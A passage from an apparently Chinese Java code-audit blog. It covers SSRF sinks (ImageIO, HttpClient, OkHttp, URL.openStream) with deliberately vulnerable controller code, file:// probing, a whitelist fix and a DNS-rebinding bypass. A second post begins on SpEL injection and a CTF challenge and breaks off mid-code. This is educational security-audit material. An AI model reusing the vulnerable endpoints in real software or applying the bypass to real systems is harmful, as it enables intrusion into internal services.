<code>1.txt</code></p><p>这段代码，设置mime类型为文件类型，访问浏览器的时候就会被下载下来。</p><p>同样可以使用file协议，能够成功下载文件</p><p><img src="/img/ssrf/ss06.png"></p><h5 id="imageIO中的SSRF"><a href="#imageIO中的SSRF" class="headerlink" title="imageIO中的SSRF"></a>imageIO中的SSRF</h5><p>imageIO类是jdk中自带的一个类，主要用于操作一些图片文件。比如读写、压缩图片。</p><p>ssrf 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ssrf</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BufferedImage <span class="hljs-title function_">read</span><span class="hljs-params">(URL url)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (url == <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;输入内容为空&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">InputStream</span>  <span class="hljs-variable">istream</span> <span class="hljs-operator">=</span> url.openStream();<br>        <span class="hljs-type">ImageInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span>  ImageIO.createImageInputStream(istream);  <span class="hljs-comment">//获取文件</span><br>        <span class="hljs-type">BufferedImage</span> <span class="hljs-variable">bi</span> <span class="hljs-operator">=</span> ImageIO.read(stream);  <span class="hljs-comment">//返回 BufferedImage作为供给的解码结果</span><br>        <span class="hljs-keyword">return</span> bi;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//图片读取</span><br>    <span class="hljs-meta">@GetMapping(&quot;/httpclient&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">downloadImage</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String imageUrl,</span><br><span class="hljs-params">                              HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 设置响应内容类型为PNG图片</span><br>        response.setContentType(<span class="hljs-string">&quot;image/png&quot;</span>);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>             <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream()) &#123;<br>            <span class="hljs-comment">// 从URL读取图片</span><br>            <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(imageUrl);<br>            <span class="hljs-type">BufferedImage</span> <span class="hljs-variable">image</span> <span class="hljs-operator">=</span> ImageIO.read(url);<br>            <span class="hljs-keyword">if</span> (image != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 将图片写入字节数组输出流</span><br>                ImageIO.write(image, <span class="hljs-string">&quot;png&quot;</span>, os);<br>                <span class="hljs-comment">// 将字节数组写入响应输出流</span><br>                <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(os.toByteArray())) &#123;<br>                    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                    <span class="hljs-type">int</span> bytesRead;<br>                    <span class="hljs-keyword">while</span> ((bytesRead = input.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                        outputStream.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="hljs-string">&quot;无法从指定URL获取图片&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, <span class="hljs-string">&quot;图片处理出错&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以通过https协议访问图片</p><p><img src="/img/ssrf/ss07.png"></p><p>可以通过file协议访问图片，无法访问其他文件。在程序中设置了抛出异常，访问文件时会有error提示</p><p><img src="/img/ssrf/ss08.png"></p><p>若未设置抛出异常，能够看到文件是否存在</p><p>如：</p><p><img src="https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200917061817662-1567997288.png"></p><p><img src="https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200917061828967-1388285250.png"></p><p>如果文件不存在的话会显示找不到指定文件，而存在但文件不为图片文件的话则显示image&#x3D;&#x3D;null。</p><h5 id="HttpClient下的SSRF"><a href="#HttpClient下的SSRF" class="headerlink" title="HttpClient下的SSRF"></a>HttpClient下的SSRF</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CloseableHttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> HttpClients.createDefault();<br><span class="hljs-type">HttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpClient</span>();<br><span class="hljs-type">HttpGet</span> <span class="hljs-variable">getRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpGet</span>(url);<br><span class="hljs-type">HttpResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> httpClient.execute(getRequest);<br></code></pre></td></tr></table></figure><h5 id="OkHttp-下的SSRF"><a href="#OkHttp-下的SSRF" class="headerlink" title="OkHttp 下的SSRF"></a>OkHttp 下的SSRF</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>.Builder()<br>     .url(<span class="hljs-string">&quot;http://publicobject.com/helloworld.txt&quot;</span>)<br>     .build();<br><br> <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> client.newCall(request).execute();<br></code></pre></td></tr></table></figure><h4 id="白盒规则"><a href="#白盒规则" class="headerlink" title="白盒规则"></a>白盒规则</h4><p>上面的漏洞代码可总结为4种情况：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Author: JoyChou(2017年04月11日)</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* 第一种情况</span><br><span class="hljs-comment"> * Request类</span><br><span class="hljs-comment"> */</span><br>Request.Get(url).execute()<br><br><span class="hljs-comment">/* 第二种情况</span><br><span class="hljs-comment"> * URL类的openStream</span><br><span class="hljs-comment"> */</span><br> URL u;<br> <span class="hljs-type">int</span> length;<br> <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br> u = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br> inputStream = u.openStream();<br><br><span class="hljs-comment">/* 第三种情况</span><br><span class="hljs-comment"> * HttpClient</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1&quot;</span>;<br><span class="hljs-type">CloseableHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> HttpClients.createDefault();<br><span class="hljs-type">HttpGet</span> <span class="hljs-variable">httpGet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpGet</span>(url);<br>HttpResponse httpResponse;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 该行代码发起网络请求</span><br>    httpResponse = client.execute(httpGet);<br><br><span class="hljs-comment">/* 第四种情况</span><br><span class="hljs-comment"> * URLConnection和HttpURLConnection</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> url.openConnection();<br><span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> url.openConnection();<br></code></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>那么，根据利用的方式，修复方法就比较简单。</p><ul><li>限制协议为HTTP、HTTPS协议。</li><li>禁止URL传入内网IP或者设置URL白名单。</li><li>不用限制302重定向。</li></ul><p>漏洞修复代码如下：</p><p>需要添加guava库(目的是获取一级域名)，在pom.xml中添加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.google.guava&lt;/groupId&gt;<br>    &lt;artifactId&gt;guava&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">21.0</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>代码的验证逻辑：</p><ol><li>验证协议是否为http或者https</li><li>验证url是否在白名单内</li></ol><p>函数调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] urlwhitelist = &#123;<span class="hljs-string">&quot;joychou.org&quot;</span>, <span class="hljs-string">&quot;joychou.me&quot;</span>&#125;;<br><span class="hljs-keyword">if</span> (!securitySSRFUrlCheck(url, urlwhitelist)) &#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数验证代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Boolean <span class="hljs-title function_">securitySSRFUrlCheck</span><span class="hljs-params">(String url, String[] urlwhitelist)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>        <span class="hljs-comment">// 只允许http和https的协议通过</span><br>        <span class="hljs-keyword">if</span> (!u.getProtocol().startsWith(<span class="hljs-string">&quot;http&quot;</span>) &amp;&amp; !u.getProtocol().startsWith(<span class="hljs-string">&quot;https&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span>  <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-comment">// 获取域名，并转为小写</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost().toLowerCase();<br>        <span class="hljs-comment">// 获取一级域名</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">rootDomain</span> <span class="hljs-operator">=</span> InternetDomainName.from(host).topPrivateDomain().toString();<br><br>        <span class="hljs-keyword">for</span> (String whiteurl: urlwhitelist)&#123;<br>            <span class="hljs-keyword">if</span> (rootDomain.equals(whiteurl)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="DNS-Rebinding-Bypass-SSRF"><a href="#DNS-Rebinding-Bypass-SSRF" class="headerlink" title="DNS Rebinding Bypass SSRF"></a>DNS Rebinding Bypass SSRF</h3><p>详细请看：<a href="https://xz.aliyun.com/news/8300">https://xz.aliyun.com/news/8300</a></p><p>由于我们是用它来绕过SSRF漏洞，所以简单理解就是：当某一个SSRF检测是通过DNS解析后的<code>ip地址</code>来判断是否为安全地址的话，我们可以通过<code>DNS rebinding</code>来进行绕过。</p><h4 id="传统SSRF过滤流程"><a href="#传统SSRF过滤流程" class="headerlink" title="传统SSRF过滤流程"></a>传统SSRF过滤流程</h4><ol><li>获取到输入的URL，从该URL中提取host</li><li>对该host进行DNS解析，获取到解析的IP</li><li>检测该IP是否是合法的，比如是否是私有IP等</li><li>如果IP检测为合法的，则进入curl的阶段发包</li></ol><p>从DNS解析的角度来看，这个过程一共有两次解析，第一次是<code>对该host进行DNS解析</code>，第二次是<code>进入curl的阶段发包</code>，这两次请求之间存在一个时间差，如果我们能够修改DNS地址在第一次请求的时候为合法地址，第二次请求时为恶意地址，就可以绕过这个检测了。</p><h4 id="DNS-Rebinding如何利用？"><a href="#DNS-Rebinding如何利用？" class="headerlink" title="DNS Rebinding如何利用？"></a>DNS Rebinding如何利用？</h4><blockquote><p>攻击者注册一个域名（如attacker.com），并在攻击者控制下将其代理给DNS服务器。 服务器配置为很短响应时间的TTL记录，防止响应被缓存。 当受害者浏览到恶意域时，攻击者的DNS服务器首先用托管恶意客户端代码的服务器的IP地址作出响应。 例如，他们可以将受害者的浏览器指向包含旨在在受害者计算机上执行的恶意JavaScript或Flash脚本的网站。<br>恶意客户端代码会对原始域名（例如attacker.com）进行额外访问。 这些都是由同源政策所允许的。 但是，当受害者的浏览器运行该脚本时，它会为该域创建一个新的DNS请求，并且攻击者会使用新的IP地址进行回复。 例如，他们可以使用内部IP地址或互联网上某个目标的IP地址进行回复。</p></blockquote><p>TTL是一条域名解析记录在DNS服务器中的存留时间。把这个值设置的非常小可以防止DNS解析结果被缓存，进而使得每次获取DNS解析结果是不同的。</p><p>简单理一下这个过程：</p><ol><li>攻击者配置了一台DNS服务器用于解析某域名</li><li>每次请求后返回的解析结果不一样，分别是一个合法地址，一个是恶意地址</li><li>当服务器在第一次请求的时候返回合法地址，第二次请求时返回的是恶意地址。就可以绕过限制进行利用</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/news/195">SSRF in Java-先知社区 (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13683023.html">Java 审计之SSRF篇（续） - nice_0e3 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13682434.html">Java 审计之SSRF篇 - nice_0e3 - 博客园 (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/news/8300">DNS Rebinding Bypass SSRF-先知社区 (aliyun.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的SpEL注入</title>
    <link href="/2025/07/23/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/07/23/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="SpEL表达式的功能与使用"><a href="#SpEL表达式的功能与使用" class="headerlink" title="SpEL表达式的功能与使用"></a>SpEL表达式的功能与使用</h3><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul><li>访问对象属性：SpEL表达式可以通过对象引用来访问对象的属性，例如${object.property}。</li><li>调用方法：SpEL表达式可以调用对象的方法，例如${object.method()}。</li><li>进行算术运算：SpEL表达式支持各种算术运算符，如加法、减法、乘法和除法。</li><li>进行逻辑运算：SpEL表达式支持逻辑运算符，如与、或、非等。</li><li>进行条件判断：SpEL表达式可以进行条件判断，例如通过if语句判断条件，并执行相应的操作。</li><li>访问集合元素和属性：SpEL表达式可以通过索引或键来访问集合中的元素或对象的属性。</li><li>执行正则表达式匹配：SpEL表达式可以执行正则表达式匹配，并返回匹配结果。</li><li>访问上下文变量和参数：SpEL表达式可以访问上下文中的变量和方法参数。</li><li>进行类型转换：SpEL表达式可以进行类型转换操作，将一个对象转换为另一种类型。</li><li>支持特殊操作符：SpEL表达式支持一些特殊的操作符，如Elvis操作符（?:）、安全导航操作符（?.）等。</li></ul><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><h5 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h5><p>一般SpEL表达式语法与python语法有些像，此处有详细总结：<a href="https://blog.csdn.net/A_art_xiang/article/details/134370029">Spring-SpEL表达式超级详细使用全解-CSDN博客</a></p><p>这里来看几个较为特殊的用法</p><p>spel语法中的<code>T()</code>操作符 , <code>T()</code>操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法<code>T(全限定类名).方法名()</code>，后面会用得到</p><p>spel中的<code>#</code>操作符可以用于标记对象，SpEL 表达式可以用 <code>#变量名</code> 的形式访问它们</p><ol><li><p>获取类的类型<br>可以使用特殊的T运算符来指定java.lang.Class的实例(类型)。静态方法也是通过使用这个操作符来调用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">dateClass</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;T(java.util.Date)&quot;</span>).getValue(Class.class);<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">stringClass</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;T(String)&quot;</span>).getValue(Class.class);<br><br><span class="hljs-type">boolean</span> <span class="hljs-variable">trueValue</span> <span class="hljs-operator">=</span> parser.parseExpression(<br>                <span class="hljs-string">&quot;T(java.math.RoundingMode).CEILING &lt; T(java.math.RoundingMode).FLOOR&quot;</span>)<br>        .getValue(Boolean.class);<br><br></code></pre></td></tr></table></figure></li><li><p>用 <code>#变量名</code> 的形式访问变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">context.setVariable(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">10</span>);<br><span class="hljs-type">Integer</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;#x + 20&quot;</span>).getValue(context, Integer.class); <span class="hljs-comment">// 结果：30</span><br></code></pre></td></tr></table></figure></li><li><p>表达式模板</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 通常使用#&#123;&#125;作为模板，与字符串拼接起来</span><br><span class="hljs-type">String</span> <span class="hljs-variable">randomPhrase</span> <span class="hljs-operator">=</span> parser.parseExpression(<br>        <span class="hljs-string">&quot;random number is #&#123;T(java.lang.Math).random()&#125;&quot;</span>,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateParserContext</span>()).getValue(String.class);<br><br><span class="hljs-comment">// evaluates to &quot;random number is 0.7038186818312008&quot;</span><br><br></code></pre></td></tr></table></figure><p>或者找到源码中定义的地方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TemplateParserContext 的定义</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplateParserContext</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ParserContext</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getExpressionPrefix</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;#&#123;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getExpressionSuffix</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isTemplate</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h5 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h5><p>SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p><p>示例1:不注册新变量的用法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br><span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>System.out.println( exp.getValue() );<span class="hljs-comment">//取值，Hello World！</span><br></code></pre></td></tr></table></figure><p>示例2:自定义注册加载变量的用法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spel</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;何止&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Spel</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Spel</span>();<br>        StandardEvaluationContext context=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>        context.setVariable(<span class="hljs-string">&quot;user&quot;</span>,user);<span class="hljs-comment">//通过StandardEvaluationContext注册自定义变量</span><br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;#user.name&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>        System.out.println( expression.getValue(context).toString() );<span class="hljs-comment">//取值,输出何止</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="SpEL表达式注入攻击"><a href="#SpEL表达式注入攻击" class="headerlink" title="SpEL表达式注入攻击"></a>SpEL表达式注入攻击</h3><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/89d8d5cfac7a40b9bb61835a5fd9b5f4~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp"></p><h4 id="攻击条件-敏感函数"><a href="#攻击条件-敏感函数" class="headerlink" title="攻击条件(敏感函数)"></a>攻击条件(敏感函数)</h4><ol><li>使用StandardEvaluationContext，</li><li>未对输入的SpEL进行校验，或有方法绕过</li><li>对表达式调用了getValue()或parseExpression()函数或getAdvanceValue函数。</li></ol><h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><ul><li>getValue()，parseExpression()，getAdvanceValue()</li><li>StandardEvaluationContext()，ExpressionParser()，SpelExpressionParser()</li></ul><h4 id="Code-Breaking-javacon"><a href="#Code-Breaking-javacon" class="headerlink" title="Code-Breaking javacon"></a>Code-Breaking javacon</h4><p>下载源码</p><p><a href="https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar">https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar</a></p><p>使用命令运行环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar C:\Users\86177\Desktop\challenge-0.0.1-SNAPSHOT.jar<br></code></pre></td></tr></table></figure><p>使用JD-GUI反编译(直接用IDEA反编译是不成功的)，导出后用IDEA打开</p><p>查看目录结构以及application.yml文件</p><p><img src="/img/spel/s01.png"></p><p>可以看到是有spel表达式调用的，但是也有黑名单</p><p>查看MainController文件</p><p>可以看到getAdvanceValue函数(动态解析用户输入的 Spring 表达式（SpEL）并返回执行结果，它在解析前会对输入内容做黑名单关键词过滤，阻止执行危险表达式)，此函数是SpELl注入漏洞出发点</p><p><img src="/img/spel/s02.png"></p><p>搜索关键字getAdvanceValue</p><p>可以看到admin方法中若rememberMeValue不为空，则会将此值做解密处理，将获得的值作为username属性</p><p>此时的username可控，可以实现SpEL注入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping</span><br><span class="hljs-comment">/*     */</span>   <span 